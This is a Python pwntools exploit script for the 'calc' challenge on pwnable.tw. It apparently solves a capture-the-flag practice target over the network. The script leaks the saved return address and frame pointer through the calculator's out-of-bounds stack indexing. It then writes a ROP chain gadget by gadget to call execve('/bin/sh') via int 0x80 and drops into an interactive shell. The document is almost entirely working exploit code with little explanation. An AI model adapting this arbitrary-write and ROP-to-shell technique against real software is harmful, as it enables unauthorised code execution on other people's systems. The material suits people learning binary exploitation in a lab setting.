from pwn import *

binary = "./calc"
context.clear(arch='i386')

elf = ELF(binary)

#p = process("./calc")
p = remote("chall.pwnable.tw", 10100)

def unsign_negative_int(n):
    return n + 2**32

def read(n):
    op = b''
    if n > 0:
        op = b'+'
    p.sendline(op + str(n).encode())
    return unsign_negative_int(int(p.recvline().strip(b'\n'))) % 0x100000000 

def write(offset, n):
    op = b''
    if n > 0:
        op = b'+'
    p.sendline(b'+' + str(offset).encode() + op + str(n).encode())
    return unsign_negative_int(int(p.recvline().strip(b'\n')))

p.recvuntil(b'\n')

# leak saved rip
rip_leak = read(361)
print(f'[rip leak] {hex(rip_leak)}')


# leak base pointer
bp_leak = read(360) - 0x20 
print(f'[ebp leak] {hex(bp_leak)}')

print(hex(bp_leak+8))


# set up rop
rop = ROP(elf)
payload = [
    # set up data
    rop.find_gadget(["pop ecx", "pop ebx", "ret"]).address,
    int.from_bytes(b"/bin","little"),
    int.from_bytes(b"/sh\x00","little"),
    rop.find_gadget(["pop edx", "ret"]).address,
    int.from_bytes(b"\x00\x00\x00\x00","little"),
    rop.find_gadget(["ret"]).address,
    # write payload
    rop.find_gadget(["pop eax", "ret"]).address,
    11,
    rop.find_gadget(["pop ecx", "pop ebx", "ret"]).address,
    bp_leak+0x14,
    bp_leak+0x8,
    rop.find_gadget(["pop edx", "ret"]).address,
    bp_leak+0x10,
    rop.find_gadget(["int 0x80"]).address,
    # exit code payload
    rop.find_gadget(["pop eax", "ret"]).address,
    1,
    rop.find_gadget(["pop ebx", "ret"]).address,
    69,
    rop.find_gadget(["int 0x80"]).address
    ]


offset = 361
for address in payload:
    current_address_data = read(offset)
    while current_address_data != address:
        write(offset, address-current_address_data)
        current_address_data = read(offset)
    print(hex(current_address_data))
    offset+=1

p.interactive()
# overwrite return address
'''
p.sendline(b"")

exit_code = p.poll()
while exit_code is None:
    exit_code = p.poll()
print(exit_code)
'''
